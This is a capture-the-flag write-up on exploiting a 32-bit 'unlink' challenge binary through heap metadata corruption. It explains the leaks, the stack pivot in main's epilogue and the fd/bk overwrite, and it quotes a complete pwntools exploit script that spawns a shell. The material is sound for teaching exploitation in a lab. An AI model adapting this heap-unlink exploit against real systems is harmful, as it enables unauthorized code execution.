### unlink
first note that `unlink` is 32 bit elf:
```
unlink@ubuntu:~$ ./unlink 
here is stack address leak: 0xffe95234
here is heap address leak: 0x8468410
now that you have leaks, get shell!
blah
unlink@ubuntu:~$ readelf -h unlink
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x80483f0
  Start of program headers:          52 (bytes into file)
  Start of section headers:          6300 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         9
  Size of section headers:           40 (bytes)
  Number of section headers:         31
  Section header string table index: 28

```
So It should be compiled with the -m32 flag, Then I added memset instructions to be able to understand the memory layout of the heap:
```
 memset(malloc(1024),0x12,1024);
  OBJ* A = (OBJ*)malloc(sizeof(OBJ));
  memset(A,0x34,sizeof(OBJ));
  OBJ* B = (OBJ*)malloc(sizeof(OBJ));
  memset(B,0x56,sizeof(OBJ));
  OBJ* C = (OBJ*)malloc(sizeof(OBJ));
  memset(C,0x78,sizeof(OBJ));
```

I can scp the `unlink` binary from the server.

This one was tough,  
The `system@plt` and the `shell` are both in non writable sections so
it is impossible to directly use them. After enough frustration I read a hint that
I have to look at the code right before returning from main.
there is a code there:
```
80485ff:       8b 4d fc                mov    -0x4(%ebp),%ecx
8048602:       c9                      leave  
8048603:       8d 61 fc                lea    -0x4(%ecx),%esp
8048606:       c3                      ret    
```
So `$ecx` is loaded to have the value from the stack and then dereferenced.
So the idea is to choose an address from the heap to contain the address of `shell`
and then another address from the heap will point to it.
One improtant thing to note is that the `malloc` on the server might behave different
than the local `malloc`. For example my `malloc` had 4 bytes separation between A and B while the server's `malloc` has 8 . So the offsets calculation is different. 

My solution is overwriting `B` as follows:
```
[fd (points to B->buf+4)][bk (points to $ebp-4)]
[buf[0:4] points to shell func][buf[4:8] points to buf[0:4]]
```
It is implemented in the script `solution.py`. The script works,
but note that it has `MALLOC_TAG_SZ = 16` which is for my own malloc.
For the server it should be `MALLOC_TAG_SZ = 8`.
Also, for some reason, after getting the shell, when I run `ls` it shows nothing
only when I run `ls` again it show `ls`'s output. 

Here is the intended solution:
```
cat intended_solution.txt
from pwn import *
context.arch = 'i386'	# i386 / arm
r = process(['/home/unlink/unlink'])
leak = r.recvuntil('shell!\n')
stack = int(leak.split('leak: 0x')[1][:8], 16)
heap = int(leak.split('leak: 0x')[2][:8], 16)
shell = 0x80484eb
payload = pack(shell)		# heap + 8  (new ret addr)
payload += pack(heap + 12)	# heap + 12 (this -4 becomes ESP at ret)
payload += '3333'		# heap + 16
payload += '4444'
payload += pack(stack - 0x20)	# eax. (address of old ebp of unlink) -4
payload += pack(heap + 16)	# edx.
r.sendline( payload )
r.interactive()
```
